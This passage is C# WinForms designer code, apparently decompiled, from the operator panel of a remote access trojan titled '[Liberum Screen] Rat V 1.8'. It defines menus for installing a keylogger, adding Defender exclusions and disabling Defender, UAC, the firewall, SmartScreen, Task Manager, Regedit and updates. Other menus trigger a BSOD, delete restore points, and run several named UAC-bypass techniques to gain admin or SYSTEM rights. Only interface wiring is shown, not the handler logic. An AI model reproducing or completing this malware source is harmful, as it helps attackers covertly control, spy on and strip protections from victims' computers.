		this.toolStripMenuItem38.Click += new System.EventHandler(toolStripMenuItem38_Click);
		this.toolStripMenuItem101.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem101.Image");
		this.toolStripMenuItem101.Name = "toolStripMenuItem101";
		this.toolStripMenuItem101.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem101.Text = "Defender Exclusion";
		this.toolStripMenuItem101.Click += new System.EventHandler(toolStripMenuItem101_Click);
		this.toolStripSeparator3.Name = "toolStripSeparator3";
		this.toolStripSeparator3.Size = new System.Drawing.Size(179, 6);
		this.toolStripMenuItem40.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem40.Image");
		this.toolStripMenuItem40.Name = "toolStripMenuItem40";
		this.toolStripMenuItem40.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem40.Text = "Key Logger Setup";
		this.toolStripMenuItem40.Click += new System.EventHandler(toolStripMenuItem40_Click);
		this.toolStripMenuItem42.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem42.Image");
		this.toolStripMenuItem42.Name = "toolStripMenuItem42";
		this.toolStripMenuItem42.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem42.Text = "Key Logger Uninstall";
		this.toolStripMenuItem42.Click += new System.EventHandler(toolStripMenuItem42_Click);
		this.toolStripSeparator4.Name = "toolStripSeparator4";
		this.toolStripSeparator4.Size = new System.Drawing.Size(179, 6);
		this.toolStripMenuItem43.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem43.Image");
		this.toolStripMenuItem43.Name = "toolStripMenuItem43";
		this.toolStripMenuItem43.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem43.Text = "Install Nfx3";
		this.toolStripMenuItem43.Click += new System.EventHandler(toolStripMenuItem43_Click);
		this.toolStripMenuItem44.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem44.Image");
		this.toolStripMenuItem44.Name = "toolStripMenuItem44";
		this.toolStripMenuItem44.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem44.Text = "BSOD";
		this.toolStripMenuItem44.Click += new System.EventHandler(toolStripMenuItem44_Click);
		this.toolStripMenuItem45.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem45.Image");
		this.toolStripMenuItem45.Name = "toolStripMenuItem45";
		this.toolStripMenuItem45.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem45.Text = "Delete Restore";
		this.toolStripMenuItem45.Click += new System.EventHandler(toolStripMenuItem45_Click);
		this.toolStripMenuItem46.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem46.Image");
		this.toolStripMenuItem46.Name = "toolStripMenuItem46";
		this.toolStripMenuItem46.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem46.Text = "Reset Scale";
		this.toolStripMenuItem46.Click += new System.EventHandler(toolStripMenuItem46_Click);
		this.toolStripSeparator5.Name = "toolStripSeparator5";
		this.toolStripSeparator5.Size = new System.Drawing.Size(179, 6);
		this.toolStripMenuItem47.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem48, this.toolStripMenuItem49 });
		this.toolStripMenuItem47.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem47.Image");
		this.toolStripMenuItem47.Name = "toolStripMenuItem47";
		this.toolStripMenuItem47.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem47.Text = "Regedit";
		this.toolStripMenuItem48.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem48.Image");
		this.toolStripMenuItem48.Name = "toolStripMenuItem48";
		this.toolStripMenuItem48.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem48.Text = "Enable";
		this.toolStripMenuItem48.Click += new System.EventHandler(toolStripMenuItem48_Click);
		this.toolStripMenuItem49.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem49.Image");
		this.toolStripMenuItem49.Name = "toolStripMenuItem49";
		this.toolStripMenuItem49.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem49.Text = "Disable";
		this.toolStripMenuItem49.Click += new System.EventHandler(toolStripMenuItem49_Click);
		this.toolStripMenuItem50.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem51, this.toolStripMenuItem52 });
		this.toolStripMenuItem50.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem50.Image");
		this.toolStripMenuItem50.Name = "toolStripMenuItem50";
		this.toolStripMenuItem50.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem50.Text = "Task mgr";
		this.toolStripMenuItem51.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem51.Image");
		this.toolStripMenuItem51.Name = "toolStripMenuItem51";
		this.toolStripMenuItem51.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem51.Text = "Enable";
		this.toolStripMenuItem51.Click += new System.EventHandler(toolStripMenuItem51_Click);
		this.toolStripMenuItem52.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem52.Image");
		this.toolStripMenuItem52.Name = "toolStripMenuItem52";
		this.toolStripMenuItem52.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem52.Text = "Disable";
		this.toolStripMenuItem52.Click += new System.EventHandler(toolStripMenuItem52_Click);
		this.toolStripMenuItem53.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem54, this.toolStripMenuItem55 });
		this.toolStripMenuItem53.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem53.Image");
		this.toolStripMenuItem53.Name = "toolStripMenuItem53";
		this.toolStripMenuItem53.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem53.Text = "Shell";
		this.toolStripMenuItem54.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem54.Image");
		this.toolStripMenuItem54.Name = "toolStripMenuItem54";
		this.toolStripMenuItem54.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem54.Text = "Enable";
		this.toolStripMenuItem54.Click += new System.EventHandler(toolStripMenuItem54_Click);
		this.toolStripMenuItem55.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem55.Image");
		this.toolStripMenuItem55.Name = "toolStripMenuItem55";
		this.toolStripMenuItem55.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem55.Text = "Disable";
		this.toolStripMenuItem55.Click += new System.EventHandler(toolStripMenuItem55_Click);
		this.toolStripMenuItem56.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem57, this.toolStripMenuItem58 });
		this.toolStripMenuItem56.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem56.Image");
		this.toolStripMenuItem56.Name = "toolStripMenuItem56";
		this.toolStripMenuItem56.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem56.Text = "Win+R";
		this.toolStripMenuItem57.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem57.Image");
		this.toolStripMenuItem57.Name = "toolStripMenuItem57";
		this.toolStripMenuItem57.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem57.Text = "Enable";
		this.toolStripMenuItem57.Click += new System.EventHandler(toolStripMenuItem57_Click);
		this.toolStripMenuItem58.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem58.Image");
		this.toolStripMenuItem58.Name = "toolStripMenuItem58";
		this.toolStripMenuItem58.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem58.Text = "Disable";
		this.toolStripMenuItem58.Click += new System.EventHandler(toolStripMenuItem58_Click);
		this.toolStripSeparator6.Name = "toolStripSeparator6";
		this.toolStripSeparator6.Size = new System.Drawing.Size(179, 6);
		this.toolStripMenuItem59.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem60, this.toolStripMenuItem61 });
		this.toolStripMenuItem59.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem59.Image");
		this.toolStripMenuItem59.Name = "toolStripMenuItem59";
		this.toolStripMenuItem59.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem59.Text = "Defender";
		this.toolStripMenuItem60.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem60.Image");
		this.toolStripMenuItem60.Name = "toolStripMenuItem60";
		this.toolStripMenuItem60.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem60.Text = "Enable";
		this.toolStripMenuItem60.Click += new System.EventHandler(toolStripMenuItem60_Click);
		this.toolStripMenuItem61.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem61.Image");
		this.toolStripMenuItem61.Name = "toolStripMenuItem61";
		this.toolStripMenuItem61.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem61.Text = "Disable";
		this.toolStripMenuItem61.Click += new System.EventHandler(toolStripMenuItem61_Click);
		this.toolStripMenuItem62.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem63, this.toolStripMenuItem64 });
		this.toolStripMenuItem62.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem62.Image");
		this.toolStripMenuItem62.Name = "toolStripMenuItem62";
		this.toolStripMenuItem62.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem62.Text = "Uac";
		this.toolStripMenuItem63.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem63.Image");
		this.toolStripMenuItem63.Name = "toolStripMenuItem63";
		this.toolStripMenuItem63.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem63.Text = "Enable";
		this.toolStripMenuItem63.Click += new System.EventHandler(toolStripMenuItem63_Click);
		this.toolStripMenuItem64.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem64.Image");
		this.toolStripMenuItem64.Name = "toolStripMenuItem64";
		this.toolStripMenuItem64.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem64.Text = "Disable";
		this.toolStripMenuItem64.Click += new System.EventHandler(toolStripMenuItem64_Click);
		this.toolStripMenuItem65.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem66, this.toolStripMenuItem67 });
		this.toolStripMenuItem65.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem65.Image");
		this.toolStripMenuItem65.Name = "toolStripMenuItem65";
		this.toolStripMenuItem65.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem65.Text = "Firewall";
		this.toolStripMenuItem66.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem66.Image");
		this.toolStripMenuItem66.Name = "toolStripMenuItem66";
		this.toolStripMenuItem66.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem66.Text = "Enable";
		this.toolStripMenuItem66.Click += new System.EventHandler(toolStripMenuItem66_Click);
		this.toolStripMenuItem67.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem67.Image");
		this.toolStripMenuItem67.Name = "toolStripMenuItem67";
		this.toolStripMenuItem67.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem67.Text = "Disable";
		this.toolStripMenuItem67.Click += new System.EventHandler(toolStripMenuItem67_Click);
		this.toolStripMenuItem68.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem69, this.toolStripMenuItem70 });
		this.toolStripMenuItem68.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem68.Image");
		this.toolStripMenuItem68.Name = "toolStripMenuItem68";
		this.toolStripMenuItem68.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem68.Text = "Smart Screen";
		this.toolStripMenuItem69.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem69.Image");
		this.toolStripMenuItem69.Name = "toolStripMenuItem69";
		this.toolStripMenuItem69.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem69.Text = "Enable";
		this.toolStripMenuItem69.Click += new System.EventHandler(toolStripMenuItem69_Click);
		this.toolStripMenuItem70.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem70.Image");
		this.toolStripMenuItem70.Name = "toolStripMenuItem70";
		this.toolStripMenuItem70.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem70.Text = "Disable";
		this.toolStripMenuItem70.Click += new System.EventHandler(toolStripMenuItem70_Click);
		this.toolStripMenuItem71.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem72, this.toolStripMenuItem73 });
		this.toolStripMenuItem71.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem71.Image");
		this.toolStripMenuItem71.Name = "toolStripMenuItem71";
		this.toolStripMenuItem71.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem71.Text = "Update";
		this.toolStripMenuItem72.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem72.Image");
		this.toolStripMenuItem72.Name = "toolStripMenuItem72";
		this.toolStripMenuItem72.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem72.Text = "Enable";
		this.toolStripMenuItem72.Click += new System.EventHandler(toolStripMenuItem72_Click);
		this.toolStripMenuItem73.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem73.Image");
		this.toolStripMenuItem73.Name = "toolStripMenuItem73";
		this.toolStripMenuItem73.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem73.Text = "Disable";
		this.toolStripMenuItem73.Click += new System.EventHandler(toolStripMenuItem73_Click);
		this.toolStripMenuItem86.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.toolStripMenuItem87, this.toolStripMenuItem88, this.toolStripSeparator2, this.toolStripMenuItem89, this.toolStripMenuItem90, this.toolStripMenuItem91, this.toolStripMenuItem92, this.toolStripMenuItem93, this.toolStripMenuItem94 });
		this.toolStripMenuItem86.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem86.Image");
		this.toolStripMenuItem86.Name = "toolStripMenuItem86";
		this.toolStripMenuItem86.Size = new System.Drawing.Size(163, 22);
		this.toolStripMenuItem86.Text = "Uac";
		this.toolStripMenuItem87.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem87.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem87.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem87.Image");
		this.toolStripMenuItem87.Name = "toolStripMenuItem87";
		this.toolStripMenuItem87.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem87.Text = "Run As Admin Uac";
		this.toolStripMenuItem87.Click += new System.EventHandler(toolStripMenuItem87_Click);
		this.toolStripMenuItem88.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem88.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem88.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem88.Image");
		this.toolStripMenuItem88.Name = "toolStripMenuItem88";
		this.toolStripMenuItem88.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem88.Text = "Run As System";
		this.toolStripMenuItem88.Click += new System.EventHandler(toolStripMenuItem88_Click);
		this.toolStripSeparator2.Name = "toolStripSeparator2";
		this.toolStripSeparator2.Size = new System.Drawing.Size(170, 6);
		this.toolStripMenuItem89.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem89.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem89.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem89.Image");
		this.toolStripMenuItem89.Name = "toolStripMenuItem89";
		this.toolStripMenuItem89.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem89.Text = "Eventvwr";
		this.toolStripMenuItem89.Click += new System.EventHandler(toolStripMenuItem89_Click);
		this.toolStripMenuItem90.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem90.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem90.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem90.Image");
		this.toolStripMenuItem90.Name = "toolStripMenuItem90";
		this.toolStripMenuItem90.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem90.Text = "Fodhelper";
		this.toolStripMenuItem90.Click += new System.EventHandler(toolStripMenuItem90_Click);
		this.toolStripMenuItem91.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem91.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem91.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem91.Image");
		this.toolStripMenuItem91.Name = "toolStripMenuItem91";
		this.toolStripMenuItem91.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem91.Text = "Computerdefaults";
		this.toolStripMenuItem91.Click += new System.EventHandler(toolStripMenuItem91_Click);
		this.toolStripMenuItem92.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem92.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem92.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem92.Image");
		this.toolStripMenuItem92.Name = "toolStripMenuItem92";
		this.toolStripMenuItem92.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem92.Text = "SDCLT";
		this.toolStripMenuItem92.Click += new System.EventHandler(toolStripMenuItem92_Click);
		this.toolStripMenuItem93.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem93.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem93.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem93.Image");
		this.toolStripMenuItem93.Name = "toolStripMenuItem93";
		this.toolStripMenuItem93.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem93.Text = "SLUI";
		this.toolStripMenuItem93.Click += new System.EventHandler(toolStripMenuItem93_Click);
		this.toolStripMenuItem94.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem94.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem94.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem94.Image");
		this.toolStripMenuItem94.Name = "toolStripMenuItem94";
		this.toolStripMenuItem94.Size = new System.Drawing.Size(173, 22);
		this.toolStripMenuItem94.Text = "DiskCleanup";
		this.toolStripMenuItem94.Click += new System.EventHandler(toolStripMenuItem94_Click);
		this.toolStripMenuItem95.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem96, this.toolStripMenuItem102 });
		this.toolStripMenuItem95.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem95.Image");
		this.toolStripMenuItem95.Name = "toolStripMenuItem95";
		this.toolStripMenuItem95.Size = new System.Drawing.Size(163, 22);
		this.toolStripMenuItem95.Text = "System Control";
		this.toolStripMenuItem96.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripMenuItem97, this.toolStripMenuItem98, this.toolStripMenuItem99, this.toolStripMenuItem100 });
		this.toolStripMenuItem96.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem96.Image");
		this.toolStripMenuItem96.Name = "toolStripMenuItem96";
		this.toolStripMenuItem96.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem96.Text = "Client";
		this.toolStripMenuItem97.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem97.Image");
		this.toolStripMenuItem97.Name = "toolStripMenuItem97";
		this.toolStripMenuItem97.Size = new System.Drawing.Size(120, 22);
		this.toolStripMenuItem97.Text = "Exit";
		this.toolStripMenuItem97.Click += new System.EventHandler(toolStripMenuItem97_Click);
		this.toolStripMenuItem98.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem98.Image");
		this.toolStripMenuItem98.Name = "toolStripMenuItem98";
		this.toolStripMenuItem98.Size = new System.Drawing.Size(120, 22);
		this.toolStripMenuItem98.Text = "Update";
		this.toolStripMenuItem98.Click += new System.EventHandler(toolStripMenuItem98_Click);
		this.toolStripMenuItem99.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem99.Image");
		this.toolStripMenuItem99.Name = "toolStripMenuItem99";
		this.toolStripMenuItem99.Size = new System.Drawing.Size(120, 22);
		this.toolStripMenuItem99.Text = "Restart";
		this.toolStripMenuItem99.Click += new System.EventHandler(toolStripMenuItem99_Click);
		this.toolStripMenuItem100.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem100.Image");
		this.toolStripMenuItem100.Name = "toolStripMenuItem100";
		this.toolStripMenuItem100.Size = new System.Drawing.Size(120, 22);
		this.toolStripMenuItem100.Text = "Uninstall";
		this.toolStripMenuItem100.Click += new System.EventHandler(toolStripMenuItem100_Click);
		this.toolStripMenuItem102.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.toolStripMenuItem103, this.toolStripMenuItem104, this.toolStripMenuItem105 });
		this.toolStripMenuItem102.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem102.Image");
		this.toolStripMenuItem102.Name = "toolStripMenuItem102";
		this.toolStripMenuItem102.Size = new System.Drawing.Size(112, 22);
		this.toolStripMenuItem102.Text = "System";
		this.toolStripMenuItem103.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem103.Image");
		this.toolStripMenuItem103.Name = "toolStripMenuItem103";
		this.toolStripMenuItem103.Size = new System.Drawing.Size(128, 22);
		this.toolStripMenuItem103.Text = "Shutdown";
		this.toolStripMenuItem103.Click += new System.EventHandler(toolStripMenuItem103_Click);
		this.toolStripMenuItem104.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem104.Image");
		this.toolStripMenuItem104.Name = "toolStripMenuItem104";
		this.toolStripMenuItem104.Size = new System.Drawing.Size(128, 22);
		this.toolStripMenuItem104.Text = "Restart";
		this.toolStripMenuItem104.Click += new System.EventHandler(toolStripMenuItem104_Click);
		this.toolStripMenuItem105.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem105.Image");
		this.toolStripMenuItem105.Name = "toolStripMenuItem105";
		this.toolStripMenuItem105.Size = new System.Drawing.Size(128, 22);
		this.toolStripMenuItem105.Text = "LogOut";
		this.toolStripMenuItem105.Click += new System.EventHandler(toolStripMenuItem105_Click);
		this.sToolStripMenuItem11.Name = "sToolStripMenuItem11";
		this.sToolStripMenuItem11.Size = new System.Drawing.Size(160, 6);
		this.removeToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.removeToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.removeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("removeToolStripMenuItem.Image");
		this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
		this.removeToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.removeToolStripMenuItem.Text = "Remove";
		this.removeToolStripMenuItem.Click += new System.EventHandler(removeToolStripMenuItem_Click);
		this.renameToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("renameToolStripMenuItem.Image");
		this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
		this.renameToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.renameToolStripMenuItem.Text = "Rename";
		this.renameToolStripMenuItem.Click += new System.EventHandler(renameToolStripMenuItem_Click);
		this.runOnceRunAllToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runOnceRunAllToolStripMenuItem.Image");
		this.runOnceRunAllToolStripMenuItem.Name = "runOnceRunAllToolStripMenuItem";
		this.runOnceRunAllToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.runOnceRunAllToolStripMenuItem.Text = "RunOnce/RunAll";
		this.runOnceRunAllToolStripMenuItem.Click += new System.EventHandler(runOnceRunAllToolStripMenuItem_Click);
		this.timer1.Enabled = true;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(1403, 597);
		base.Controls.Add(this.menuStrip2);
		base.Controls.Add(this.panel1);
		base.Controls.Add(this.materialTabControl1);
		base.DrawerTabControl = this.materialTabControl1;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Form1";
		this.Text = "[Liberum Screen] Rat    V 1.8";
		base.Load += new System.EventHandler(Form1_Load);
		this.contextMenuStrip1.ResumeLayout(false);
		this.menuStrip2.ResumeLayout(false);
		this.menuStrip2.PerformLayout();
		this.materialTabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.GridClients).EndInit();
		this.tabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.GridLogs).EndInit();
		this.contextMenuStrip2.ResumeLayout(false);
		this.tabPage3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		this.contextMenuStrip3.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
